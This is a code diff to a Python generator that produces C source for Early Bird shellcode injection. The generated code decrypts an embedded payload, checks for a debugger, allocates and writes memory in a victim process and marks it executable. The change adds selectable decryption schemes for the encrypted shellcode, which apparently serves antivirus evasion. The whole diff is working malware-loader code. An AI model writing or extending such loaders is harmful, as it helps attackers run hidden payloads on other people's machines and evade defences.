@@ -1,4 +1,5 @@
-def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key_var,key_hex):
+from Encryption.Choose_Decryption import Choose_Decryption
+def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key_var,key_hex,encryption_type):
     EarlyBird_Injection=f"""
     unsigned char {shellcode_var}[] = {ciphertext_split}
 
@@ -47,7 +48,10 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key
                 CheckRemoteDebuggerPresent(GetCurrentProcess(), &bIsDbgPresent);
                 // Allocate Virtual Memory 
                 NtAllocateVirtualMemory(victimProcess, &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                {xor_func}({shellcode_var}, sizeof({shellcode_var}), {key_var}, sizeof({key_var}));
+
+              
+               {Choose_Decryption(encryption_type,xor_func,shellcode_var,key_var)}
+
                 // Copy shellcode into allocated memory
                 NtWriteVirtualMemory(victimProcess, allocation_start, {shellcode_var}, sizeof({shellcode_var}), 0);
                 NtProtectVirtualMemory(victimProcess, &allocation_start, (PSIZE_T)&allocation_size, PAGE_EXECUTE_READ, &oldProtect);
